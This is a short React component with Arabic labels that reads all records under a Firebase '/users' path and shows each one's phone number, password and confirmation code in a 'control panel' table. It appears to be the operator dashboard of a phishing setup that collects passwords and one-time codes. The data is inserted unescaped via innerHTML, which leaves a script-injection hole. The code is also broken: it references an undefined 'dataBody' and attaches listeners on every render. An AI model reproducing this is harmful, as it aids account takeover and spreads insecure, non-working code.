import React, { useEffect, useState } from "react";
import { database } from "../firebase";

import { get, query, onChildAdded, ref } from "firebase/database";
const TableTwo = () => {
  const [dt, setDt] = useState([{ phone: "", pass: "", code: "" }]);
  const dbRef = ref(database, "/users");
  const qw = query(dbRef);
  const im = [];
  onChildAdded(qw, (s) => {
    const row = document.createElement("tr");
    if (s.exists) {
      row.innerHTML = `
    <td>${s.val().phone.code}</td>
    <td>${s.val().phone.pass}</td>

        <td>${s.val().phone.phone}</td>
        <!-- Add more cells as per your data structure -->
    `;
      dataBody.appendChild(row);
    }
  });

  useEffect(() => {
    console.log("رمز التاكيد");
  }, [onChildAdded]);

  return (
    <>
      <head>
        <title>لوحة التحكم</title>
      </head>

      <div>
        <div className="responstable" spacing={1}>
          <div xs={12} md={12} lg={12}>
            <table className="responstable" border="1" dir="rtl">
              <thead>
                <tr>
                  <th>كود</th>

                  <th>هاتف</th>
                  <th>رمز السري</th>

                  {/* Add more columns as per your data structure */}
                </tr>
              </thead>
              <tbody id="dataBody"></tbody>
            </table>
          </div>
        </div>
      </div>
    </>
  );
};
export default TableTwo;
